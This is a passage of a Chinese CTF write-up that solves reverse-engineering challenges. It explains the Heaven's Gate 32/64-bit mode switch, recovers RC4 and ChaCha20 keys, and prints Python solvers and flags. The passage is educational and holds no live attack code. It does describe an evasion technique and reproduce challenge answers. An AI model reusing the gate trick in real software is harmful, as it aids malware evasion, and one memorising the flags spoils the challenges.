class="number">1634</span>,</span><br><span class="line">    <span class="number">1243</span>, <span class="number">2165</span>, <span class="number">813</span>, <span class="number">1650</span>, <span class="number">941</span>, <span class="number">1676</span>, <span class="number">813</span>, <span class="number">1697</span>, <span class="number">783</span>, <span class="number">1589</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1654</span>, <span class="number">1167</span>, <span class="number">2097</span>, <span class="number">1255</span>, <span class="number">2157</span>, <span class="number">941</span>, <span class="number">1673</span>, <span class="number">789</span>, <span class="number">1597</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1655</span>, <span class="number">941</span>, <span class="number">1653</span>, <span class="number">813</span>, <span class="number">1673</span>, <span class="number">789</span>, <span class="number">1598</span>, <span class="number">891</span>, <span class="number">1735</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1600</span>, <span class="number">629</span>, <span class="number">1076</span>, <span class="number">891</span>, <span class="number">1728</span>, <span class="number">603</span>, <span class="number">1008</span>, <span class="number">389</span>, <span class="number">827</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>, <span class="number">2</span>):</span><br><span class="line">    newA, newB = array3[i], array3[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        num2 = ((a &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFF</span>) ^ <span class="number">83</span></span><br><span class="line">        newA_calc = ((num2 + a) ^ (a + <span class="number">72</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span> newA_calc != newA:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        val = (newB - newA) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        b = num2 ^ val</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= b &lt; <span class="number">256</span>:</span><br><span class="line">            flag_bytes.extend([a, b])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag_bytes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{3f619a0b_Would_you_say_that_someone_who_had_every_intention_to_be_brave_was_a_coward?_81dd64f3}</p>
<h3 id="天堂之门"><a href="#天堂之门" class="headerlink" title="天堂之门"></a>天堂之门</h3><p>可以直接看，之前做DubheCTF的时候做到过类似的题，这题算是弱化版吧</p>
<p><a target="_blank" rel="noopener" href="https://clovershrub.github.io/2024/03/19/DubheCTF-Destination&Moon/index.html">DubheCTF-Destination&amp;Moon | Clovershrub</a></p>
<p>这个Dubhe和SUS都出过类似的题刚好做过</p>
<p>也可以看我的<a href="https://matriy330.github.io/de9c80c5/?highlight=%E5%A4%A9%E5%A0%82">DubheCTF 2024 re 复现 | Matriy’s blog</a></p>
<p>天堂之门技术简述：</p>
<blockquote>
<p>在<strong>x64</strong>下的进程，不管是32位或者是64位，实际上都映射了两个地址空间，一个是32位，一个是64位，相当于一个进程的两种工作模式。</p>
<p>解释：在64位的操作系统上，32位的应用程序并不能直接在64位环境下运行。为了使32位程序可以正常运行，操作系统提供了一个称为<strong>WoW64</strong>（Windows on Windows 64-bit）的子系统。WoW64 子系统相当于一个兼容层，专门为32位程序提供了类似32位的运行环境。</p>
<p>他们之间的关键区别在于<code>cs</code>段寄存器。</p>
<p>64位:CS &#x3D; 0x33 32位:CS &#x3D; 0x23</p>
<p>Windows判别位的方式，是根据<code>cs</code>段寄存器的，所以只要修改<code>cs</code>的值，就能实现切换，再使用<code>retf</code>指令回到xx位。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013132901694.png" alt="image-20251013132901694"></p>
<p>0x401720 的 main 中，通过 get_image_base() 拿到模块基址，接着在 0x40180C 初始化 rc4_state，for循环里执行 memcpy(&amp;rc4_state[64 * i], Src, 0x40u)，做 4 次。因为 Src 就是 PE 镜像开头（DOS 头），每次拷贝 0x40 字节，四次拼起来正好 256 字节，这就是 RC4 状态数组的来源。</p>
<p>get_image_base里的三次 memcpy 把 NtCurrentPeb()-&gt;Ldr 结构一路走链表：先取 PEB-&gt;Ldr，再取 Ldr-&gt;InMemoryOrderModuleList.Flink。这是标准的 PEB 遍历流程，返回的就是当前模块的装载基址，也就是 DOS&#x2F;PE 头所在的地址。</p>
<blockquote>
<p>做的时候没有调试，上面这个猜也能猜到，虽然我是静态出的</p>
</blockquote>
<p>如果调试也行：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013143506165.png" alt="image-20251013143506165"></p>
<p>此时 EAX 就是 Src 的值，也就是当前模块的装载基址。右键 EAX → Follow in Dump，Dump 窗口会直接显示该地址的内存内容；可以看到开头是 4D 5A … 的 DOS 头</p>
<p>main读取 40 字符输入，复制 PE 头首 0x40 字节 4 次到 256 字节状态，调用 rc4_transform 做 RC4 变换，再把结果与 0x405000 处的10 个 dword 比较</p>
<p>这里我提供两种分析方式</p>
<p><strong>静态分析</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013163703598.png" alt="image-20251013163703598"></p>
<p>这段所有的提取出来</p>
<p>有几种方式发现逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stub_bytes = [</span><br><span class="line">    0x6A, 0x33, 0x68, 0x78, 0x56, 0x34, 0x12, 0xCB, 0x56, 0x57, 0x48, 0xBE,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x00, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9, 0x41, 0xFE,</span><br><span class="line">    0xC0, 0x42, 0x0F, 0xB6, 0x04, 0x07, 0x41, 0x00, 0xC1, 0x42, 0x8A, 0x14,</span><br><span class="line">    0x0F, 0x42, 0x88, 0x14, 0x07, 0x42, 0x88, 0x04, 0x0F, 0x42, 0x0F, 0xB6,</span><br><span class="line">    0x04, 0x07, 0x42, 0x02, 0x04, 0x0F, 0x40, 0x0F, 0xB6, 0x04, 0x07, 0x30,</span><br><span class="line">    0x06, 0x48, 0xFF, 0xC6, 0xE2, 0xD4, 0x5F, 0x5E, 0x6A, 0x23, 0x68, 0x78,</span><br><span class="line">    0x56, 0x34, 0x12, 0x48, 0xCB, 0xC3</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ol>
<li><p>丢给chatgpt</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly2">Online x86 and x64 Intel Instruction Assembler</a></p>
<p>手搓</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013164527419.png" alt="image-20251013164527419"></p>
</li>
<li><p>patch到一个新文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013164612347.png" alt="image-20251013164612347"></p>
</li>
<li><p>patch到IDA打开的文件的某个可用地址</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\soul\AppData\Roaming\Typora\typora-user-images\image-20251013165126021.png" alt="image-20251013165126021"></p>
</li>
</ol>
<p>动态分析</p>
<p>动调然后对</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013165208241.png" alt="image-20251013165208241"></p>
<p>下断点分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011154341441.png" alt="image-20251011154341441"></p>
<p>heavens_gate_thread 与 wow64_gate_probe transition 只是维持门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_keystream</span>(<span class="params">state: <span class="built_in">bytearray</span>, length: <span class="built_in">int</span></span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + state[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line">        <span class="keyword">yield</span> state[(state[i] + state[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    pe = Path(<span class="string">&quot;heaven.exe&quot;</span>).read_bytes()</span><br><span class="line">    state = <span class="built_in">bytearray</span>(pe[:<span class="number">0x40</span>] * <span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(state)</span><br><span class="line"></span><br><span class="line">    cipher = <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="number">0x0E</span>, <span class="number">0xEB</span>, <span class="number">0xFB</span>, <span class="number">0xC4</span>, <span class="number">0xD6</span>, <span class="number">0x60</span>, <span class="number">0x07</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x25</span>,</span><br><span class="line">        <span class="number">0x79</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x57</span>, <span class="number">0x30</span>, <span class="number">0x23</span>, <span class="number">0x29</span>, <span class="number">0x7E</span>,</span><br><span class="line">        <span class="number">0x3F</span>, <span class="number">0x2B</span>, <span class="number">0x38</span>, <span class="number">0x7C</span>, <span class="number">0x12</span>, <span class="number">0x2A</span>, <span class="number">0x79</span>, <span class="number">0x39</span>, <span class="number">0x08</span>, <span class="number">0x12</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x75</span>, <span class="number">0x7F</span>, <span class="number">0x7B</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    flag_bytes = <span class="built_in">bytes</span>(c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher, rc4_keystream(state, <span class="built_in">len</span>(cipher))))</span><br><span class="line">    <span class="built_in">print</span>(flag_bytes.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{Wh4t_4_W0nd3rfu1_g4tE_$8263fbea}</p>
<h3 id="GrilHook"><a href="#GrilHook" class="headerlink" title="GrilHook"></a>GrilHook</h3><blockquote>
<p>我是静态出的，但是出题人可能希望考察hook，或者加了反调，识别特征啥的，后面有时间再补</p>
<p>支持一下插件：<a target="_blank" rel="noopener" href="https://github.com/Lynnette177/GirlHook"><a target="_blank" rel="noopener" href="https://github.com/Lynnette177/GirlHook">Lynnette177&#x2F;GirlHook: GirlHook is a Lua-scriptable ART hook framework designed for dynamic method interception and gadget-level instrumentation on Android. G.I.R.L. stands for Gadget-Injection Runtime for Lua, highlighting its modular native core and script-driven flexibility. GirlHook是一个轻量化的运行LUA脚本的Android Hook框架</a></a></p>
<p>点点star 0.0</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lynnette.girlhook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> kotlin.text.Typography;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;girlhook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="keyword">if</span> (getSupportActionBar() != <span class="literal">null</span>) &#123;</span><br><span class="line">            getSupportActionBar().hide();</span><br><span class="line">        &#125;</span><br><span class="line">        setContentView(C0860R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">check_if_correct</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] cArr = &#123;<span class="number">171</span>, <span class="number">205</span>&#125;;</span><br><span class="line">        <span class="comment">//  [255, 158, 232, 153, 237, 224, 225, 182, 195, 162, 220, 146, 223, 162, 244, 165, 196, 162, 192, 146, 194, 163, 244, 140, 249, 153, 148, 176]</span></span><br><span class="line">        <span class="type">char</span>[] cArr2 = &#123;<span class="number">255</span>, <span class="number">158</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">237</span>, <span class="number">224</span>, <span class="number">225</span>, Typography.paragraph, <span class="number">195</span>, Typography.cent, <span class="number">220</span>, <span class="number">146</span>, <span class="number">223</span>, Typography.cent, <span class="number">244</span>, <span class="number">165</span>, <span class="number">196</span>, Typography.cent, <span class="number">192</span>, <span class="number">146</span>, <span class="number">194</span>, Typography.pound, <span class="number">244</span>, <span class="number">140</span>, <span class="number">249</span>, <span class="number">153</span>, <span class="number">148</span>, Typography.degree&#125;;</span><br><span class="line">        <span class="keyword">if</span> (str.length() != <span class="number">28</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="type">char</span>) (str.charAt(i) ^ cArr[i % <span class="number">2</span>])) != cArr2[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check_again</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> str.equals(<span class="string">&quot;AmQTDHd7fy5CIAQyRUokVD1RJ3VlJFM4WTE+CBcn&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onVerifyClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> ((EditText) findViewById(C0860R.C0863id.input_text)).getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (!check_if_correct(obj) ? check_again(obj) : <span class="literal">true</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;正确!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;错误&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是jadx打开后，非常简单，题目是hook这个肯定不对，直接看so层</p>
<p>打开就能看到waht_is,一看就非常眼熟,chacha20</p>
<blockquote>
<p>怎么看出来的?可以看我的<a href="https://matriy330.github.io/32958ffb/">CTF逆向常见加密算法总结 | Matriy’s blog</a>函数开头把四个字常量依次写进状态数组：0x61707865、0x3320646E、0x79622D32、0x6B206574</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013170901380.png" alt="image-20251013170901380"></p>
</blockquote>
<p>initial_global里调用了这个方法，去动态的hook修改方法功能</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155602338.png" alt="image-20251011155602338"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155708244.png" alt="image-20251011155708244"></p>
<p>本来想hook的，看到chacha20感觉不太复杂看看能不能直接出</p>
<p>找到secret</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155956801.png" alt="image-20251011155956801"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">SO_PATH = Path(<span class="string">&quot;libgirlhook.so&quot;</span>)</span><br><span class="line">SECRET_FILE_OFFSET = <span class="number">0x18CC40</span></span><br><span class="line">SECRET_SIZE = <span class="number">1436</span></span><br><span class="line">KEY = <span class="string">b&quot;youareclosetoit_youareclosetoit_&quot;</span></span><br><span class="line">NONCE = <span class="string">b&quot;continueabcd&quot;</span></span><br><span class="line">INITIAL_COUNTER = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl32</span>(<span class="params">value: <span class="built_in">int</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    value &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFF</span>) | (value &gt;&gt; (<span class="number">32</span> - shift))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quarter_round</span>(<span class="params">state, a, b, c, d</span>):</span><br><span class="line">    state[a] = (state[a] + state[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[d] ^= state[a]</span><br><span class="line">    state[d] = rotl32(state[d], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    state[c] = (state[c] + state[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[b] ^= state[c]</span><br><span class="line">    state[b] = rotl32(state[b], <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    state[a] = (state[a] + state[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[d] ^= state[a]</span><br><span class="line">    state[d] = rotl32(state[d], <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    state[c] = (state[c] + state[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[b] ^= state[c]</span><br><span class="line">    state[b] = rotl32(state[b], <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_block</span>(<span class="params">key_words, counter, nonce_words</span>):</span><br><span class="line">    state = [</span><br><span class="line">        <span class="number">0x61707865</span>, <span class="number">0x3320646E</span>, <span class="number">0x79622D32</span>, <span class="number">0x6B206574</span>,</span><br><span class="line">        *key_words,</span><br><span class="line">        counter,</span><br><span class="line">        *nonce_words</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    working = state.copy()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        quarter_round(working, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(working, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(working, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>)</span><br><span class="line">        quarter_round(working, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        quarter_round(working, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        quarter_round(working, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(working, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(working, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(</span><br><span class="line">        struct.pack(<span class="string">&quot;&lt;I&quot;</span>, (working[i] + state[i]) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, nonce: <span class="built_in">bytes</span>, counter: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key_words = struct.unpack(<span class="string">&quot;&lt;8I&quot;</span>, key)</span><br><span class="line">    nonce_words = struct.unpack(<span class="string">&quot;&lt;3I&quot;</span>, nonce)</span><br><span class="line"></span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    block_counter = counter</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">64</span>):</span><br><span class="line">        keystream_block = chacha20_block(key_words, block_counter, nonce_words)</span><br><span class="line">        block_counter = (block_counter + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        chunk = ciphertext[offset:offset + <span class="number">64</span>]</span><br><span class="line">        plaintext.extend(c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(chunk, keystream_block))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    so_bytes = SO_PATH.read_bytes()</span><br><span class="line">    secret = so_bytes[SECRET_FILE_OFFSET:SECRET_FILE_OFFSET + SECRET_SIZE]</span><br><span 